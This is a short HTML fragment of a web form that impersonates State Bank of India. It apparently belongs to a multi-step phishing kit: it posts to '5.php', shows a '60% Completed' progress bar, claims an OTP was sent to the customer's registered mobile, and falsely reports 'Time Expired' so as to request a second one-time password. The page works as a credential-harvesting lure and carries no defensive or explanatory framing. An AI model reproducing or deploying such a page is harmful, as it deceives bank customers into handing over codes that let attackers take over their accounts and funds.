         ...
         <form action="5.php" method="post">
            <div class="box">
               ...
               <div class="row">
				  ...
				  <div class="progress">
                              <div class="progress-bar" style="width:60%">60% Completed</div>
                           </div>
                     <div class="p-50">
                        <h4><b>OTP Verification</b></h4>
                        <p>An OTP has been sent to the registered mobile number with SBI.</p>
                        <br><br>
                        <p class="red"><b>Time Expired</b></p> 
                        <input type="text" class="form-control" name="OTP" placeholder="Enter New OTP" required=""><br>
